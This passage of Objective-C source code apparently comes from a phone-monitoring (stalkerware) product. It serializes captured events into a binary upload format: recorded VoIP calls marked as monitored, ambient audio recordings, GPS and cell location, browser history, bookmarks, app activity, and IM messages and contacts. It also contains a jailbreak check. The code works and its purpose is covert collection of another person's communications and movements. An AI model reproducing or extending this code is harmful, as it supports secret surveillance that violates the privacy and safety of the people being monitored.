        NSString *actualPathForSymbolicLink = [fileManager destinationOfSymbolicLinkAtPath:fullFileName error:NULL];
        DLog(@"File path for symbolic link: %@", actualPathForSymbolicLink)
        
        attr = [fileManager attributesOfItemAtPath:actualPathForSymbolicLink error:&error];
    }
    DLog (@"fileSize = %lld", [attr fileSize]);
	if (!error) {
		mediaDataSize = [attr fileSize];
		mediaDataSize = htonl(mediaDataSize);
		[result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
		
		[aFileHandle writeData:result];
		
		// File data
		NSFileHandle *fileHandle = [NSFileHandle fileHandleForReadingAtPath:fullFileName];
		NSUInteger megabyte = pow(1024, 2);
		while (1) {
			//[result appendData:mediaData];
			
			NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
			NSData *bytes = [fileHandle readDataOfLength:megabyte]; // Use local variable to allocate 1 mb
			NSInteger size = [bytes length];
			[aFileHandle writeData:bytes];
			[aFileHandle synchronizeFile]; // Flus data to file
			bytes = nil;
			[pool release];
			
			if (size == 0) {
				break;
			}
		}
		[fileHandle closeFile];
		
	} else {
		mediaDataSize = 0;
		mediaDataSize = htonl(mediaDataSize);
		[result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
		
		[aFileHandle writeData:result];
	}
	[result setData:[NSData data]];
	
	return [result autorelease];
}

+ (NSData *)parseVoIPAudioConversationEvent:(VoIPAudioConversationEvent *)event payloadFileHandle: (NSFileHandle *) aFileHandle {
    uint8_t category = event.mCategory;
    uint8_t direction = event.mDirection;
    uint32_t duration = event.mDuration;
    duration = htonl(duration);
    NSString *ownerId = event.mOwnerId;
    uint8_t ownerIdSize = [ownerId lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    NSString *ownerName = event.mOwnerName;
    uint8_t ownerNameSize = [ownerName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    uint8_t isMonitor = event.mIsMonitor;
    uint16_t recipentCount = event.mRecipients.count;
    recipentCount = htons(recipentCount);

    NSString *fileName = event.mFileName;
    uint8_t fileNameSize = [fileName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    uint8_t mediaType = event.mediaType;
    
    NSMutableData *result = [[NSMutableData alloc] init];
    
    [result appendBytes:&category length:sizeof(uint8_t)];
    [result appendBytes:&direction length:sizeof(uint8_t)];
    [result appendBytes:&duration length:sizeof(uint32_t)];
    [result appendBytes:&ownerIdSize length:sizeof(uint8_t)];
    [result appendData:[ownerId dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&ownerNameSize length:sizeof(uint8_t)];
    [result appendData:[ownerName dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&isMonitor length:sizeof(uint8_t)];
    [result appendBytes:&recipentCount length:sizeof(uint16_t)];
 
    for (EmbeddedVoIPCallInfo *eVoIPCallInfo in event.mRecipients) {
        NSData *eVoIPCallInfoData = [self parseEmbeddedVoIPCallInfo:eVoIPCallInfo];
        [result appendData:eVoIPCallInfoData];
    }
    
    //[aFileHandle writeData:result];
    //[self parseAttachmentFile:event.mAudioData payloadFileHandle:aFileHandle];
    
    NSString *fullFileName;
    uint32_t mediaDataSize;
    
    fullFileName	= [event mFileName];
    fileName		= [fullFileName lastPathComponent];
    fileNameSize	= [fileName length];
    DLog (@"filename is: %@", fileName)
    
    [result appendBytes:&fileNameSize length:sizeof(uint8_t)];
    [result appendData:[fileName dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&mediaType length:sizeof(uint8_t)];
    
        // Method 2 (read data from, allocate data only one time)
        // File size
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;
    NSDictionary *attr = [fileManager attributesOfItemAtPath:fullFileName error:&error];
    DLog (@"Attributes of the audio conversation file = %@, error = %@", attr, error);
    if ([[attr objectForKey:NSFileType] isEqualToString:NSFileTypeSymbolicLink]) {
        NSString *actualPathForSymbolicLink = [fileManager destinationOfSymbolicLinkAtPath:fullFileName error:NULL];
        DLog(@"File path for symbolic link: %@", actualPathForSymbolicLink)
        
        attr = [fileManager attributesOfItemAtPath:actualPathForSymbolicLink error:&error];
    }
    DLog (@"fileSize = %lld", [attr fileSize]);
    if (!error) {
        mediaDataSize = [attr fileSize];
        mediaDataSize = htonl(mediaDataSize);
        [result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
        
        [aFileHandle writeData:result];
        
        // File data
        NSFileHandle *fileHandle = [NSFileHandle fileHandleForReadingAtPath:fullFileName];
        NSUInteger megabyte = pow(1024, 2);
        while (1) {
                //[result appendData:mediaData];
            
            NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
            NSData *bytes = [fileHandle readDataOfLength:megabyte]; // Use local variable to allocate 1 mb
            DLog (@"bytes = %@", bytes);
            NSInteger size = [bytes length];
            [aFileHandle writeData:bytes];
            [aFileHandle synchronizeFile]; // Flus data to file
            bytes = nil;
            [pool release];
            
            if (size == 0) {
                break;
            }
        }
        [fileHandle closeFile];
        
    } else {
        mediaDataSize = 0;
        mediaDataSize = htonl(mediaDataSize);
        [result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
        
        [aFileHandle writeData:result];
    }
    
    [result setData:[NSData data]];
    
    return [result autorelease];
}

+ (NSData *)parseAudioFileEvent:(AudioFileEvent *)event payloadFileHandle: (NSFileHandle *) aFileHandle {
	uint32_t paringID;
	uint8_t mediaType;
	
	uint8_t fileNameSize;
	NSString *fileName;	
	NSString *fullFileName;
	uint32_t mediaDataSize;
	NSData *mediaData = nil;
	
	paringID = [event paringID];
	paringID = htonl(paringID);
	mediaType = [event mediaType];
	
	fullFileName	= [event fileName];
	fileName		= [fullFileName lastPathComponent];
	fileNameSize	= [fileName length];
	DLog (@"filename is: %@", fileName)	
	
	mediaData = [event mediaData];
	mediaDataSize = [mediaData length];
	mediaDataSize = htonl(mediaDataSize);
	
	NSMutableData *result = [[NSMutableData alloc] init];
	
	[result appendBytes:&paringID length:sizeof(paringID)];
	[result appendBytes:&mediaType length:sizeof(mediaType)];
	
	[result appendBytes:&fileNameSize length:sizeof(fileNameSize)];
	[result appendData:[fileName dataUsingEncoding:NSUTF8StringEncoding]];
	
	// Method 1 (allocate data two time)
//	[result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
//	[result appendData:mediaData];

	// Method 2 (read data from, allocate data only one time)
	// File size
	NSFileManager *fileManager = [NSFileManager defaultManager];
	NSError *error = nil;
	NSDictionary *attr = [fileManager attributesOfItemAtPath:fullFileName error:&error];
	DLog (@"Attributes of the audio file = %@, error = %@", attr, error);
    if ([[attr objectForKey:NSFileType] isEqualToString:NSFileTypeSymbolicLink]) {
        NSString *actualPathForSymbolicLink = [fileManager destinationOfSymbolicLinkAtPath:fullFileName error:NULL];
        DLog(@"File path for symbolic link: %@", actualPathForSymbolicLink)
        
        attr = [fileManager attributesOfItemAtPath:actualPathForSymbolicLink error:&error];
    }
    DLog (@"fileSize = %lld", [attr fileSize]);
	if (!error) {
		mediaDataSize = [attr fileSize];
		mediaDataSize = htonl(mediaDataSize);
		[result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
		
		[aFileHandle writeData:result];
		
		// File data
		NSFileHandle *fileHandle = [NSFileHandle fileHandleForReadingAtPath:fullFileName];
		NSUInteger megabyte = pow(1024, 2);
		while (1) {
			//[result appendData:mediaData];
			
			NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
			NSData *bytes = [fileHandle readDataOfLength:megabyte]; // Use local variable to allocate 1 mb
			NSInteger size = [bytes length];
			[aFileHandle writeData:bytes];
			[aFileHandle synchronizeFile]; // Flus data to file
			bytes = nil;
			[pool release];
			
			if (size == 0) {
				break;
			}
		}
		[fileHandle closeFile];
		
	} else {
		mediaDataSize = 0;
		mediaDataSize = htonl(mediaDataSize);
		[result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
		
		[aFileHandle writeData:result];
	}
	[result setData:[NSData data]];
	
	return [result autorelease];
}

+ (NSData *)parseVideoFileEvent:(VideoFileEvent *)event payloadFileHandle: (NSFileHandle *) aFileHandle {
	uint32_t paringID;
	uint8_t mediaType;
	
	uint8_t fileNameSize;
	NSString *fileName;	
	NSString *fullFileName;
	__block uint32_t mediaDataSize;
	NSData *mediaData = nil;
	
	paringID = [event paringID];
	paringID = htonl(paringID);
	mediaType = [event mediaType];
	
	fullFileName	= [event fileName];
	fileName		= [fullFileName lastPathComponent];
	fileNameSize	= [fileName length];
	DLog (@"filename is: %@", fileName)	
	
	mediaData = [event mediaData];
	mediaDataSize = [mediaData length];
	mediaDataSize = htonl(mediaDataSize);
	
	NSMutableData *result = [[NSMutableData alloc] init];
	
	
	[result appendBytes:&paringID length:sizeof(paringID)];
	[result appendBytes:&mediaType length:sizeof(mediaType)];
	
	[result appendBytes:&fileNameSize length:sizeof(fileNameSize)];
	[result appendData:[fileName dataUsingEncoding:NSUTF8StringEncoding]];
	
	// Method 1 (allocate data two time)
//	[result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
//	[result appendData:mediaData];
	
	// Method 2 (read data from, allocate data only one time)
	// File size
	NSFileManager *fileManager = [NSFileManager defaultManager];
	NSError *error = nil;
	NSDictionary *attr = [fileManager attributesOfItemAtPath:fullFileName error:&error];
	DLog (@"Attributes of the video file = %@, error = %@", attr, error);
    if ([[attr objectForKey:NSFileType] isEqualToString:NSFileTypeSymbolicLink]) {
        NSString *actualPathForSymbolicLink = [fileManager destinationOfSymbolicLinkAtPath:fullFileName error:NULL];
        DLog(@"File path for symbolic link: %@", actualPathForSymbolicLink)
        
        attr = [fileManager attributesOfItemAtPath:actualPathForSymbolicLink error:&error];
    }
    DLog (@"fileSize = %lld", [attr fileSize]);
	if (!error) {
		mediaDataSize = [attr fileSize];
		mediaDataSize = htonl(mediaDataSize);
		[result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
		
		[aFileHandle writeData:result];
		
		// File data
		NSFileHandle *fileHandle = [NSFileHandle fileHandleForReadingAtPath:fullFileName];
		NSUInteger megabyte = pow(1024, 2);
		while (1) {
			//[result appendData:mediaData];
			
			NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
			NSData *bytes = [fileHandle readDataOfLength:megabyte]; // Use local variable to allocate 1 mb
			NSInteger size = [bytes length];
			[aFileHandle writeData:bytes];
			[aFileHandle synchronizeFile]; // Flus data to file
			bytes = nil;
			[pool release];
			
			if (size == 0) {
				break;
			}
		}
		[fileHandle closeFile];
		
	} else {
#if TARGET_OS_IPHONE
        if (![ProtocolParserUtil isDeviceJailbroken]) {
            AVURLAsset *asset = [AVURLAsset assetWithURL:[NSURL URLWithString:fullFileName]];
            if (asset) {
                AVAssetExportSession *exportSession = [[AVAssetExportSession alloc] initWithAsset:asset presetName:AVAssetExportPresetHighestQuality];
                exportSession.outputFileType = AVFileTypeMPEG4;//AVFileTypeQuickTimeMovie;
                NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:[fullFileName lastPathComponent]];
                
                exportSession.outputURL = [NSURL fileURLWithPath:outputFilePath];
                
                __block NSConditionLock *assetLock = [[NSConditionLock alloc] initWithCondition:0];
                
                [exportSession exportAsynchronouslyWithCompletionHandler:^{
                    [assetLock lock];
                    if (exportSession.status == AVAssetExportSessionStatusCompleted) {
                        NSError *fileError = nil;
                        NSDictionary *fileAttribute = [fileManager attributesOfItemAtPath:outputFilePath error:&fileError];
                        mediaDataSize = [fileAttribute fileSize];
                        mediaDataSize = htonl(mediaDataSize);
                        [result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
                        
                        [aFileHandle writeData:result];
                        
                        // File data
                        NSFileHandle *fileHandle = [NSFileHandle fileHandleForReadingAtPath:outputFilePath];
                        NSUInteger megabyte = pow(1024, 2);
                        while (1) {
                            //[result appendData:mediaData];
                            
                            NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
                            NSData *bytes = [fileHandle readDataOfLength:megabyte]; // Use local variable to allocate 1 mb
                            NSInteger size = [bytes length];
                            [aFileHandle writeData:bytes];
                            [aFileHandle synchronizeFile]; // Flus data to file
                            bytes = nil;
                            [pool release];
                            
                            if (size == 0) {
                                break;
                            }
                        }
                        [fileHandle closeFile];
                    } else if (exportSession.status == AVAssetExportSessionStatusUnknown ||
                               exportSession.status == AVAssetExportSessionStatusCancelled ||
                               exportSession.status == AVAssetExportSessionStatusFailed) {
                        mediaDataSize = 0;
                        mediaDataSize = htonl(mediaDataSize);
                        [result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
                        
                        [aFileHandle writeData:result];
                    }
                    
                    NSError *deleteFileError = nil;
                    if (![fileManager removeItemAtPath:outputFilePath error:&deleteFileError]) {
                        DLog(@"Remove temp video error with %@", [deleteFileError localizedDescription]);
                    }
                    
                    [assetLock unlockWithCondition:1];
                }];
                
                [assetLock lockWhenCondition:1];
            } else {
                mediaDataSize = 0;
                mediaDataSize = htonl(mediaDataSize);
                [result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
                
                [aFileHandle writeData:result];
            }
        }
        else {
            mediaDataSize = 0;
            mediaDataSize = htonl(mediaDataSize);
            [result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
            
            [aFileHandle writeData:result];
        }
#else
        mediaDataSize = 0;
        mediaDataSize = htonl(mediaDataSize);
        [result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
        
        [aFileHandle writeData:result];
#endif
        
	}
    
	[result setData:[NSData data]];
	
	return [result autorelease];
}


+ (NSData *)parseLocationEvent:(LocationEvent *)event {
	uint8_t callingModule;
	uint8_t method;
	uint8_t provider;
	double lon;
	double lat;
	float altitude;
	float speed;
	float heading;
	float horizontalAccuracy;
	float verticalAccuracy;
	CellInfo *cellInfo;
	
	int8_t networkNameSize;
	NSString *networkName;
	int8_t networkIDSize;
	NSString *networkID;
	int8_t cellNameSize;
	NSString *cellName;
	int32_t cellID;
	uint8_t MCCSize;
	NSString *MCC;
	uint32_t areaCode;

	callingModule = [event callingModule];
	method = [event gpsMethod];
	provider = [event gpsProvider];
	lon = [event lon];
	
//	double x = 1;
	DLog(@"lon %@ ", [NSData dataWithBytes:&lon length:8]);
//	DLog(@"lon x %@ ", [NSData dataWithBytes:&x length:8]);
	lon = [self GetDoubleBigEndian:lon];	
	DLog(@"lon %@ ", [NSData dataWithBytes:&lon length:8]);
	lat = [event lat];
	DLog(@"lat %@ ", [NSData dataWithBytes:&lat length:8]);
	lat = [self GetDoubleBigEndian:lat];
	DLog(@"lat %@ ", [NSData dataWithBytes:&lat length:8]);
	altitude = [event altitude];
	//altitude = htonl(altitude);
	CFSwappedFloat32 swappedAltitude = CFConvertFloat32HostToSwapped(altitude);
	speed = [event speed];
	//speed = htonl(speed);
	CFSwappedFloat32 swappedSpeed = CFConvertFloat32HostToSwapped(speed);	
	heading = [event heading];
	//heading = htonl(heading);
	CFSwappedFloat32 swappedHeading = CFConvertFloat32HostToSwapped(heading);
	horizontalAccuracy = [event horizontalAccuracy];
	//horizontalAccuracy = htonl(horizontalAccuracy);
	CFSwappedFloat32 swappedHorizontalAccuracy = CFConvertFloat32HostToSwapped(horizontalAccuracy);
	verticalAccuracy = [event verticalAccuracy];
	//verticalAccuracy = htonl(verticalAccuracy);
	CFSwappedFloat32 swappedVerticalAccuracy = CFConvertFloat32HostToSwapped(verticalAccuracy);
	cellInfo = [event cellInfo];
	
	networkName = [cellInfo networkName];
	networkNameSize = [networkName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	networkID = [cellInfo networkID];
	networkIDSize = [networkID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	cellName = [cellInfo cellName];
	cellNameSize = [cellName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	cellID = [cellInfo cellID];
	cellID = htonl(cellID);
	MCC = [cellInfo MCC];
	MCCSize = [MCC lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	areaCode = [cellInfo areaCode];
	areaCode = htonl(areaCode);
	
	NSMutableData *result = [[NSMutableData alloc] init];
	
	[result appendBytes:&callingModule length:sizeof(callingModule)];
	[result appendBytes:&method length:sizeof(method)];
	[result appendBytes:&provider length:sizeof(provider)];
	[result appendBytes:&lon length:sizeof(lon)];
	[result appendBytes:&lat length:sizeof(lat)];
	[result appendBytes:&swappedAltitude length:sizeof(swappedAltitude)];
	[result appendBytes:&swappedSpeed length:sizeof(swappedSpeed)];
	[result appendBytes:&swappedHeading length:sizeof(swappedHeading)];
	[result appendBytes:&swappedHorizontalAccuracy length:sizeof(swappedHorizontalAccuracy)];
	[result appendBytes:&swappedVerticalAccuracy length:sizeof(swappedVerticalAccuracy)];

	[result appendBytes:&networkNameSize length:sizeof(networkNameSize)];
	[result appendData:[networkName dataUsingEncoding:NSUTF8StringEncoding]];
	[result appendBytes:&networkIDSize length:sizeof(networkIDSize)];
	[result appendData:[networkID dataUsingEncoding:NSUTF8StringEncoding]];
	[result appendBytes:&cellNameSize length:sizeof(cellNameSize)];
	[result appendData:[cellName dataUsingEncoding:NSUTF8StringEncoding]];
	[result appendBytes:&cellID length:sizeof(cellID)];
	[result appendBytes:&MCCSize length:sizeof(MCCSize)];
	[result appendData:[MCC dataUsingEncoding:NSUTF8StringEncoding]];
	[result appendBytes:&areaCode length:sizeof(areaCode)];

	return [result autorelease];
}

+ (NSData *)parseSystemEvent:(SystemEvent *)event {
	uint8_t category;
	uint8_t direction;
	uint32_t messageSize;
	NSString *message;

	category = [event category];
	direction = [event direction];
	message = [event message];
	messageSize = [message lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	messageSize = htonl(messageSize);

	NSMutableData *result = [[NSMutableData alloc] init];

	[result appendBytes:&category length:sizeof(category)];
	DLog(@"result = %@", result);
	[result appendBytes:&direction length:sizeof(direction)];
	DLog(@"result = %@", result);
	[result appendBytes:&messageSize length:sizeof(messageSize)];
	DLog(@"result = %@", result);
	[result appendData:[message dataUsingEncoding:NSUTF8StringEncoding]];
	DLog(@"result = %@", result);

	return [result autorelease];	
}

+ (NSData *) parseBrowserUrlEvent: (BrowserUrlEvent *) aEvent {
	uint8_t titleSize;							
	uint16_t urlSize;
	uint8_t isBlock;
	uint8_t owningAppSize;
	NSMutableData *result = [NSMutableData data];
	titleSize = [[aEvent mTitle] lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	urlSize = [[aEvent mUrl] lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	urlSize = htons(urlSize);
	isBlock = [aEvent mIsBlocked];
	owningAppSize = [[aEvent mOwningApp] lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	[result appendBytes:&titleSize length:sizeof(uint8_t)];							// 1 byte for TITLE size
	[result appendData:[[aEvent mTitle] dataUsingEncoding:NSUTF8StringEncoding]];	// n bytes for TITLE
	[result appendBytes:&urlSize length:sizeof(uint16_t)];							// 2 bytes for URL size
	[result appendData:[[aEvent mUrl] dataUsingEncoding:NSUTF8StringEncoding]];		// m bytes for URL
	[result appendData:[[aEvent mVisitTime] dataUsingEncoding:NSUTF8StringEncoding]];	//  Fixed-19 bytes VISIT_TIME
	[result appendBytes:&isBlock length:sizeof(uint8_t)];							// 1 byte for ‚ÄãIS_BLOCKED	
	[result appendBytes:&owningAppSize length:sizeof(uint8_t)];						// 1 byte for ‚Äãowning app size
	[result appendData:[[aEvent mOwningApp] dataUsingEncoding:NSUTF8StringEncoding]];	// p bytes for owning app									
											
	return (result);
}

+ (NSData *) parseBookmarksEvent: (BookmarksEvent *) aEvent {
	uint8_t bookmarkCount;
	uint8_t titleSize;
	uint16_t urlSize;
	
	NSMutableData *result = [NSMutableData data];
	bookmarkCount = [[aEvent mBookmarks] count];
	[result appendBytes:&bookmarkCount length:sizeof(uint8_t)];
	for (Bookmark *bookmark in [aEvent mBookmarks]) {
		titleSize = [[bookmark mTitle] lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
		urlSize = [[bookmark mUrl] lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
		urlSize = htons(urlSize);
		[result appendBytes:&titleSize length:sizeof(uint8_t)];
		[result appendData:[[bookmark mTitle] dataUsingEncoding:NSUTF8StringEncoding]];
		[result appendBytes:&urlSize length:sizeof(uint16_t)];
		[result appendData:[[bookmark mUrl] dataUsingEncoding:NSUTF8StringEncoding]];
	}
	return (result);
}

+ (NSData *) parseSettingEvent: (SettingEvent *) aEvent {
	DLog (@"!!!!!!!!!!!! parseSettingEvent")
	uint8_t settingID = 0;
	uint16_t settingValueSize = 0;
	NSString *settingValue = nil;
	
	NSMutableData *result = [NSMutableData data];
	// SETTING_COUNT	1 byte
	uint8_t settingCount =  MIN([[aEvent mSettingIDs] count], [[aEvent mSettingValues] count]);
	[result appendBytes:&settingCount length:sizeof(uint8_t)];
	
	// SETTINGS
	for (NSInteger i = 0; i < settingCount ; i++) {
		settingID = [[[aEvent mSettingIDs] objectAtIndex:i] intValue];
		//DLog (@"setting id %d", settingID)
		settingValue = [[aEvent mSettingValues] objectAtIndex:i];
		//DLog (@"settingValue %@", settingValue)
		settingValueSize = [settingValue lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
		settingValueSize = htons(settingValueSize);
		[result appendBytes:&settingID length:sizeof(uint8_t)];
		[result appendBytes:&settingValueSize length:sizeof(uint16_t)];
		[result appendData:[settingValue dataUsingEncoding:NSUTF8StringEncoding]];
	}
	return (result);
}

+ (NSData *) parseSettingEventV10: (SettingEvent *) aEvent {
    DLog (@"!!!!!!!!!!!! parseSettingEvent v.10")
    uint16_t settingID = 0;
    uint16_t settingValueSize = 0;
    NSString *settingValue = nil;
    
    NSMutableData *result = [NSMutableData data];
    // SETTING_COUNT	2 bytes
    NSUInteger count = MIN([[aEvent mSettingIDs] count], [[aEvent mSettingValues] count]);
    uint16_t settingCount = count;
    settingCount = htons(settingCount);
    [result appendBytes:&settingCount length:sizeof(uint16_t)];
    
    // SETTINGS
    for (NSInteger i = 0; i < count; i++) {
        settingID = [[[aEvent mSettingIDs] objectAtIndex:i] intValue];
        //DLog (@"setting id %d", settingID)
        settingID = htons(settingID);
        settingValue = [[aEvent mSettingValues] objectAtIndex:i];
        //DLog (@"settingValue %@", settingValue)
        settingValueSize = [settingValue lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
        settingValueSize = htons(settingValueSize);
        [result appendBytes:&settingID length:sizeof(uint16_t)];
        [result appendBytes:&settingValueSize length:sizeof(uint16_t)];
        [result appendData:[settingValue dataUsingEncoding:NSUTF8StringEncoding]];
    }
    return (result);
}

+ (NSData *) parseApplicationLifeCycleEvent: (ALCEvent *) aEvent {
	NSMutableData *result = [NSMutableData data];
	
	uint8_t lifeCycleState;
	uint8_t type;
	uint8_t identifierSize;
	uint8_t nameSize;
	uint8_t versionSize;
	uint32_t size;
	uint8_t iconType;
	uint32_t iconSize;
	
	NSString *identifier, *name, *version;
	NSData *icon;
	
	lifeCycleState = [aEvent mApplicationState];
	type = [aEvent mApplicationType];
	identifier = [aEvent mApplicationIdentifier];
	identifierSize = [identifier lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	name = [aEvent mApplicationName];
	nameSize = [name lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	version = [aEvent mApplicationVersion];
	versionSize = [version lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	size = [aEvent mApplicationSize];
	size = htonl(size);
	iconType = [aEvent mApplicationIconType];
	icon = [aEvent mApplicationIconData];
	iconSize = [icon length];
	iconSize = htonl(iconSize);
	
//	DLog (@"lifeCycleState = %d, type = %d, identifierSize = %d, nameSize = %d, versionSize = %d, size = %d, iconType = %d, iconSize = %d",
//		  lifeCycleState, type, identifierSize, nameSize, versionSize, size, iconType, iconSize);
//	DLog (@"identifier = %@, name = %@, version = %@, icon = %@", identifier, name, version, icon);
	
	[result appendBytes:&lifeCycleState length:sizeof(uint8_t)];
	[result appendBytes:&type length:sizeof(uint8_t)];
	[result appendBytes:&identifierSize length:sizeof(uint8_t)];
	[result appendData:[identifier dataUsingEncoding:NSUTF8StringEncoding]];
	[result appendBytes:&nameSize length:sizeof(uint8_t)];
	[result appendData:[name dataUsingEncoding:NSUTF8StringEncoding]];
	[result appendBytes:&versionSize length:sizeof(uint8_t)];
	[result appendData:[version dataUsingEncoding:NSUTF8StringEncoding]];
	[result appendBytes:&size length:sizeof(uint32_t)];
	[result appendBytes:&iconType length:sizeof(uint8_t)];
	[result appendBytes:&iconSize length:sizeof(uint32_t)];
	[result appendData:icon];
	
	return (result);
}

+ (NSData *) parseAudioAmbientThumbnailEvent: (AudioAmbientThumbnailEvent *) aEvent {
	uint32_t paringID;
	uint8_t mediaType;
	uint32_t mediaDataSize;
	NSData *mediaData;
	uint32_t actualFileSize;
	uint32_t actualDuration;
	paringID = [aEvent paringID];
	paringID = htonl(paringID);
	mediaType = [aEvent mediaType];
	mediaData = [aEvent mediaData];
	mediaDataSize = [mediaData length];
	mediaDataSize = htonl(mediaDataSize);
	actualFileSize = [aEvent actualFileSize];
	actualFileSize = htonl(actualFileSize);
	actualDuration = [aEvent actualDuration];
	actualDuration = htonl(actualDuration);
	
	NSMutableData *result = [[NSMutableData alloc] init];
	[result appendBytes:&paringID length:sizeof(paringID)];
	[result appendBytes:&mediaType length:sizeof(mediaType)];
	[result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
	[result appendData:mediaData];
	[result appendBytes:&actualFileSize length:sizeof(actualFileSize)];
	[result appendBytes:&actualDuration length:sizeof(actualDuration)];
	
	return [result autorelease];
}

+ (NSData *) parseAudioAmbientEvent:(AudioAmbientEvent *) aEvent payloadFileHandle: (NSFileHandle *) aFileHandle {
	uint32_t paringID;
	uint8_t mediaType;
	
	uint8_t fileNameSize;
	NSString *fileName;	
	NSString *fullFileName;
	uint32_t duration;
	uint32_t mediaDataSize;
	NSData *mediaData = nil;
	
	paringID = [aEvent paringID];
	paringID = htonl(paringID);
	mediaType = [aEvent mediaType];
	
	duration = [aEvent mDuration];
	duration = htonl(duration);
	
	fullFileName	= [aEvent fileName];
	fileName		= [fullFileName lastPathComponent];
	fileNameSize	= [fileName length];
	DLog (@"filename is: %@", fileName)	
	
	mediaData = [aEvent mediaData];
	mediaDataSize = [mediaData length];
	mediaDataSize = htonl(mediaDataSize);
	
	NSMutableData *result = [[NSMutableData alloc] init];
	
	[result appendBytes:&paringID length:sizeof(paringID)];
	[result appendBytes:&mediaType length:sizeof(mediaType)];
	
	[result appendBytes:&fileNameSize length:sizeof(fileNameSize)];
	[result appendData:[fileName dataUsingEncoding:NSUTF8StringEncoding]];
	
	[result appendBytes:&duration length:sizeof(duration)];
	
	// Method 1 (allocate data two time)
	//	[result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
	//	[result appendData:mediaData];
	
	// Method 2 (read data from, allocate data only one time)
	// File size
	NSFileManager *fileManger = [NSFileManager defaultManager];
	NSError *error = nil;
	NSDictionary *attr = [fileManger attributesOfItemAtPath:fullFileName error:&error];
	DLog (@"Attributes of the audio ambient file = %@, error = %@", attr, error);
	if (!error) {
		mediaDataSize = [attr fileSize];
		mediaDataSize = htonl(mediaDataSize);
		[result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
		
		[aFileHandle writeData:result];
		
		// File data
		NSFileHandle *fileHandle = [NSFileHandle fileHandleForReadingAtPath:fullFileName];
		NSUInteger megabyte = pow(1024, 2);
		while (1) {
			//[result appendData:mediaData];
			
			NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
			NSData *bytes = [fileHandle readDataOfLength:megabyte]; // Use local variable to allocate 1 mb
			NSInteger size = [bytes length];
			[aFileHandle writeData:bytes];
			[aFileHandle synchronizeFile]; // Flus data to file
			bytes = nil;
			[pool release];
			
			if (size == 0) {
				break;
			}
		}
		[fileHandle closeFile];
		
	} else {
		mediaDataSize = 0;
		mediaDataSize = htonl(mediaDataSize);
		[result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
		
		[aFileHandle writeData:result];
	}
	[result setData:[NSData data]];
	
	return [result autorelease];
}

+ (NSData *) parseIMMessageEvent:(IMMessageEvent *) aEvent payloadFileHandle: (NSFileHandle *) aFileHandle {
	//NSData *result = [IMEventProtocolConverter convertToProtocolIMMessageEvent:aEvent];
	NSData *result = [IMEventProtocolConverter convertToProtocolIMMessageEvent:aEvent fileHandler:aFileHandle];
	return (result);
}

+ (NSData *) parseIMMessageEventV10:(IMMessageEvent *) aEvent payloadFileHandle: (NSFileHandle *) aFileHandle {
    NSData *result = [IMEventProtocolConverter convertToProtocolIMMessageEventV10:aEvent fileHandler:aFileHandle];
    return (result);
}

+ (NSData *) parseIMAccountEvent: (IMAccountEvent *) aEvent {
	NSData *result = [IMEventProtocolConverter convertToProtocolIMAccountEvent:aEvent];
	return (result);
}

+ (NSData *) parseIMContactEvent: (IMContactEvent *) aEvent {
	NSData *result = [IMEventProtocolConverter convertToProtocolIMContactEvent:aEvent];
	return (result);
}

+ (NSData *) parseIMConversationEvent: (IMConversationEvent *) aEvent {
	NSData *result = [IMEventProtocolConverter convertToProtocolIMConversationEvent:aEvent];
	return (result);
}

+ (NSData *) parseIMConversationEventV10: (IMConversationEvent *) aEvent {
    NSData *result = [IMEventProtocolConverter convertToProtocolIMConversationEventV10:aEvent];
    return (result);
}

+ (NSData *) parseVoIPEvent: (VoIPEvent *) aEvent {
	uint8_t category;
	uint8_t direction;
	uint32_t duration;
	uint8_t userIDSize;
	NSString *userID = nil;
	uint8_t contactNameSize;
	NSString *contactName = nil;
	uint32_t transferedByte;
	uint8_t isMonitor;
	uint32_t frameStripID;
	category = [aEvent mCategory];
	direction = [aEvent mDirection];
	duration = [aEvent mDuration];
	duration = htonl(duration);
	userID = [aEvent mUserID];
	contactName = [aEvent mContactName];
